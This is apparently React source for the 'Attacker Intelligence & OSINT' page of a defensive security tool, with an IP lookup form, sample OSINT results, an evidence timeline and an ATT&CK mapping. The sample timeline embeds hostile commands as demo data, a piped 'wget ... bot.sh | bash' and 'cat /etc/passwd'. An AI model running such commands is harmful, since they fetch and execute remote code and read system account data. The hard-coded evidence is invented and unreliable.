import React, { useState } from 'react';
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Badge } from "@/components/ui/badge";
import {
  Search,
  Globe,
  User,
  FileText,
  Shield,
  AlertTriangle,
  Download,
  ExternalLink,
  Copy,
  Check
} from "lucide-react";
import { PageHeader } from '@/components/ui-custom/PageHeader';
import { toast } from "sonner";
import { api } from "@/api/client";

const InfoCard = ({ icon: Icon, title, description, tutorial }) => (
  <Card className="border-blue-200 bg-blue-50">
    <CardContent className="pt-4">
      <div className="flex items-start gap-3">
        <div className="w-10 h-10 rounded-lg bg-blue-100 flex items-center justify-center flex-shrink-0">
          <Icon className="w-5 h-5 text-blue-700" />
        </div>
        <div>
          <p className="font-semibold text-blue-900 mb-1">{title}</p>
          <p className="text-sm text-blue-700 mb-2">{description}</p>
          {tutorial && (
            <p className="text-xs text-blue-600 font-mono bg-blue-100 px-2 py-1 rounded">
              {tutorial}
            </p>
          )}
        </div>
      </div>
    </CardContent>
  </Card>
);

const OSINTResultCard = ({ result }) => {
  const [copied, setCopied] = useState(false);

  const handleCopy = (text) => {
    navigator.clipboard.writeText(text);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
    toast.success('Copied to clipboard');
  };

  return (
    <Card>
      <CardHeader className="pb-3">
        <div className="flex items-start justify-between">
          <div className="flex-1">
            <div className="flex items-center gap-2 mb-1">
              <CardTitle className="text-base">{result.title}</CardTitle>
              <Badge variant={result.confidence === 'high' ? 'default' : 'outline'}>
                {result.confidence} confidence
              </Badge>
            </div>
            <CardDescription className="text-xs">{result.source}</CardDescription>
          </div>
        </div>
      </CardHeader>
      <CardContent>
        <div className="space-y-2">
          {result.data.map((item, idx) => (
            <div key={idx} className="flex items-start justify-between text-sm p-2 bg-slate-50 rounded">
              <div className="flex-1">
                <p className="text-xs text-slate-500">{item.label}</p>
                <p className="font-mono text-sm">{item.value}</p>
              </div>
              <Button
                size="sm"
                variant="ghost"
                onClick={() => handleCopy(item.value)}
              >
                {copied ? <Check className="w-3 h-3 text-green-600" /> : <Copy className="w-3 h-3" />}
              </Button>
            </div>
          ))}
          {result.links && result.links.length > 0 && (
            <div className="pt-2 border-t">
              {result.links.map((link, idx) => (
                <a
                  key={idx}
                  href={link.url}
                  target="_blank"
                  rel="noopener noreferrer"
                  className="flex items-center gap-2 text-xs text-blue-600 hover:underline py-1"
                >
                  <ExternalLink className="w-3 h-3" />
                  {link.text}
                </a>
              ))}
            </div>
          )}
        </div>
      </CardContent>
    </Card>
  );
};

const EvidenceTimeline = ({ events }) => (
  <div className="space-y-4">
    {events.map((event, idx) => (
      <div key={idx} className="flex gap-3">
        <div className="flex flex-col items-center">
          <div className="w-8 h-8 rounded-full bg-blue-100 flex items-center justify-center">
            <event.icon className="w-4 h-4 text-blue-700" />
          </div>
          {idx < events.length - 1 && (
            <div className="w-0.5 h-full bg-slate-200 mt-2" />
          )}
        </div>
        <div className="flex-1 pb-4">
          <p className="font-medium text-sm">{event.action}</p>
          <p className="text-xs text-slate-500 mt-1">{event.timestamp}</p>
          {event.details && (
            <p className="text-xs text-slate-600 mt-2 bg-slate-50 p-2 rounded font-mono">
              {event.details}
            </p>
          )}
        </div>
      </div>
    ))}
  </div>
);

export default function AttackerIntelligence() {
  const [searchQuery, setSearchQuery] = useState('');
  const [searchType, setSearchType] = useState('ip');
  const [isSearching, setIsSearching] = useState(false);

  const [osintResults] = useState([
    {
      id: '1',
      title: 'IP Geolocation',
      source: 'MaxMind GeoIP Database',
      confidence: 'high',
      data: [
        { label: 'Country', value: 'Russia' },
        { label: 'City', value: 'Moscow' },
        { label: 'ISP', value: 'TimeWeb Ltd.' },
        { label: 'Organization', value: 'Shared Hosting Provider' },
        { label: 'Coordinates', value: '55.7558° N, 37.6173° E' }
      ],
      links: [
        { text: 'View on Google Maps', url: '#' }
      ]
    },
    {
      id: '2',
      title: 'Threat Intelligence',
      source: 'AbuseIPDB, GreyNoise',
      confidence: 'high',
      data: [
        { label: 'Reports', value: '234 abuse reports' },
        { label: 'Categories', value: 'SSH Brute Force, Port Scanning' },
        { label: 'Last Reported', value: '2 days ago' },
        { label: 'Confidence Score', value: '98/100' }
      ],
      links: [
        { text: 'View full AbuseIPDB report', url: '#' }
      ]
    },
    {
      id: '3',
      title: 'Network Analysis',
      source: 'Shodan, Censys',
      confidence: 'medium',
      data: [
        { label: 'Open Ports', value: '22 (SSH), 80 (HTTP), 443 (HTTPS)' },
        { label: 'Services', value: 'OpenSSH 7.4, Apache 2.4.6' },
        { label: 'Vulnerabilities', value: '3 known CVEs' }
      ],
      links: [
        { text: 'View Shodan scan', url: '#' }
      ]
    },
    {
      id: '4',
      title: 'Domain Association',
      source: 'DNS Records, WHOIS',
      confidence: 'medium',
      data: [
        { label: 'Associated Domains', value: 'malicious-site[.]ru, bot-network[.]com' },
        { label: 'Registration Date', value: '2023-08-15' },
        { label: 'Registrar', value: 'RU-CENTER-REG' }
      ]
    }
  ]);

  const [evidenceTimeline] = useState([
    {
      icon: Globe,
      action: 'Initial Connection',
      timestamp: '2024-01-30 14:23:15 UTC',
      details: 'TCP SYN to port 22 from 45.33.32.156'
    },
    {
      icon: User,
      action: 'Authentication Attempts',
      timestamp: '2024-01-30 14:23:18 UTC',
      details: 'Failed login attempts: root, admin, user, test'
    },
    {
      icon: Shield,
      action: 'Successful Login',
      timestamp: '2024-01-30 14:24:32 UTC',
      details: 'Login as "admin" with password "admin123"'
    },
    {
      icon: FileText,
      action: 'File System Access',
      timestamp: '2024-01-30 14:24:45 UTC',
      details: 'Commands: ls -la, cat /etc/passwd, whoami'
    },
    {
      icon: Download,
      action: 'Malware Download Attempt',
      timestamp: '2024-01-30 14:25:12 UTC',
      details: 'wget http://45.33.32.156/bot.sh | bash'
    },
    {
      icon: AlertTriangle,
      action: 'Lateral Movement Attempt',
      timestamp: '2024-01-30 14:26:03 UTC',
      details: 'SSH scan to internal network 10.0.0.0/24'
    }
  ]);

  const [osintResult, setOsintResult] = useState(null);

  const handleSearch = async () => {
    if (!searchQuery?.trim()) {
      toast.error('Enter a search query');
      return;
    }
    if (searchType !== 'ip') {
      toast.info('AbuseIPDB supports IPv4 only. Use IP address for full results.');
    }
    setIsSearching(true);
    setOsintResult(null);
    try {
      const { data } = await api.functions.invoke('osintLookup', {
        query: searchQuery.trim(),
        type: searchType,
      });
      if (data?.configured === false) {
        toast.error(data.error || 'OSINT not configured');
        return;
      }
      setOsintResult(data);
      toast.success('OSINT lookup complete');
    } catch (err) {
      toast.error('Search failed: ' + (err?.message || 'Unknown error'));
    } finally {
      setIsSearching(false);
    }
  };

  return (
    <div className="space-y-6">
      <PageHeader
        title="Attacker Intelligence & OSINT"
        description="Investigate and track attackers using open-source intelligence"
        actions={
          <Button variant="outline">
            <Download className="w-4 h-4 mr-2" />
            Generate Police Report
          </Button>
        }
      />

      {/* Tutorial */}
      <InfoCard
        icon={Shield}
        title="What is OSINT?"
        description="Open-Source Intelligence (OSINT) means gathering information from publicly available sources. We'll search databases, social media, DNS records, and more to build a complete profile of the attacker."
        tutorial="💡 All data comes from public sources - no illegal hacking involved!"
      />

      {/* Search Section */}
      <Card>
        <CardHeader>
          <CardTitle>Investigate Attacker</CardTitle>
          <CardDescription>
            Enter an IP address, domain, email, or username to begin investigation
          </CardDescription>
        </CardHeader>
        <CardContent>
          <div className="space-y-4">
            <div className="grid grid-cols-1 md:grid-cols-4 gap-3">
              <div className="md:col-span-3">
                <Label>Search Query</Label>
                <Input
                  placeholder="e.g., 45.33.32.156 or attacker@example.com"
                  value={searchQuery}
                  onChange={(e) => setSearchQuery(e.target.value)}
                  className="mt-1"
                />
              </div>
              <div>
                <Label>Type</Label>
                <select 
                  value={searchType} 
                  onChange={(e) => setSearchType(e.target.value)}
                  className="mt-1 w-full h-9 rounded-md border border-slate-200 px-3 text-sm"
                >
                  <option value="ip">IP Address</option>
                  <option value="domain">Domain</option>
                  <option value="email">Email</option>
                  <option value="username">Username</option>
                </select>
              </div>
            </div>
            <Button onClick={handleSearch} disabled={isSearching} className="w-full">
              <Search className="w-4 h-4 mr-2" />
              {isSearching ? 'Searching...' : 'Run OSINT Investigation'}
            </Button>
          </div>
        </CardContent>
      </Card>

      {/* Results */}
      <Tabs defaultValue="osint">
        <TabsList className="bg-slate-100">
          <TabsTrigger value="osint">OSINT Results</TabsTrigger>
          <TabsTrigger value="timeline">Evidence Timeline</TabsTrigger>
          <TabsTrigger value="techniques">Attack Techniques</TabsTrigger>
        </TabsList>

        <TabsContent value="osint" className="mt-6 space-y-4">
          {osintResult && (
            <Card>
              <CardHeader>
                <CardTitle>AbuseIPDB Results</CardTitle>
                <CardDescription>IP reputation from AbuseIPDB</CardDescription>
              </CardHeader>
              <CardContent>
                <div className="grid grid-cols-2 md:grid-cols-4 gap-4 text-sm">
                  <div className="p-3 bg-slate-50 rounded">
                    <p className="text-xs text-slate-500">Abuse Score</p>
                    <p className="text-xl font-bold">{osintResult.abuseConfidenceScore ?? 0}/100</p>
                  </div>
                  <div className="p-3 bg-slate-50 rounded">
                    <p className="text-xs text-slate-500">Total Reports</p>
                    <p className="text-xl font-bold">{osintResult.totalReports ?? 0}</p>
                  </div>
                  <div className="p-3 bg-slate-50 rounded">
                    <p className="text-xs text-slate-500">Country</p>
                    <p className="font-mono">{osintResult.country || 'N/A'}</p>
                  </div>
                  <div className="p-3 bg-slate-50 rounded">
                    <p className="text-xs text-slate-500">ISP</p>
                    <p className="font-mono truncate" title={osintResult.isp}>{osintResult.isp || 'N/A'}</p>
                  </div>
                </div>
              </CardContent>
            </Card>
          )}
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            {osintResults.map((result) => (
              <OSINTResultCard key={result.id} result={result} />
            ))}
          </div>
        </TabsContent>

        <TabsContent value="timeline" className="mt-6">
          <Card>
            <CardHeader>
              <CardTitle>Attack Timeline</CardTitle>
              <CardDescription>
                Complete chronological record of attacker activity - admissible as evidence
              </CardDescription>
            </CardHeader>
            <CardContent>
              <EvidenceTimeline events={evidenceTimeline} />
            </CardContent>
          </Card>
        </TabsContent>

        <TabsContent value="techniques" className="mt-6">
          <Card>
            <CardHeader>
              <CardTitle>MITRE ATT&CK Mapping</CardTitle>
              <CardDescription>
                Attacker tactics and techniques observed during intrusion
              </CardDescription>
            </CardHeader>
            <CardContent>
              <div className="space-y-3">
                {[
                  { tactic: 'Initial Access', technique: 'T1078 - Valid Accounts', description: 'Used brute force to obtain valid credentials' },
                  { tactic: 'Execution', technique: 'T1059 - Command Execution', description: 'Executed shell commands via SSH session' },
                  { tactic: 'Persistence', technique: 'T1053 - Scheduled Task', description: 'Attempted to create cron job for backdoor' },
                  { tactic: 'Discovery', technique: 'T1018 - Network Discovery', description: 'Scanned internal network for additional targets' },
                  { tactic: 'Command and Control', technique: 'T1071 - Application Layer', description: 'Contacted C2 server on port 4444' }
                ].map((item, idx) => (
                  <div key={idx} className="p-3 border rounded-lg">
                    <div className="flex items-center gap-2 mb-1">
                      <Badge>{item.tactic}</Badge>
                      <p className="text-sm font-mono">{item.technique}</p>
                    </div>
                    <p className="text-xs text-slate-600">{item.description}</p>
                  </div>
                ))}
              </div>
            </CardContent>
          </Card>
        </TabsContent>
      </Tabs>

      {/* Export for Law Enforcement */}
      <Card className="border-amber-200 bg-amber-50">
        <CardContent className="pt-4">
          <div className="flex items-start gap-3">
            <Shield className="w-5 h-5 text-amber-700 mt-0.5 flex-shrink-0" />
            <div>
              <p className="font-semibold text-amber-900 text-sm mb-1">Evidence Collection</p>
              <p className="text-xs text-amber-700 mb-3">
                All collected data (IP logs, commands, timestamps, OSINT findings) is stored in tamper-proof format. You can export a complete evidence package for law enforcement with:
              </p>
              <ul className="text-xs text-amber-700 space-y-1 mb-3">
                <li>• Chain of custody documentation</li>
                <li>• Cryptographic hashes of all logs</li>
                <li>• Complete timeline with UTC timestamps</li>
                <li>• OSINT findings with sources cited</li>
                <li>• MITRE ATT&CK mapping for prosecutors</li>
              </ul>
              <Button size="sm" variant="outline">
                <Download className="w-3 h-3 mr-2" />
                Export Complete Evidence Package
              </Button>
            </div>
          </div>
        </CardContent>
      </Card>
    </div>
  );
}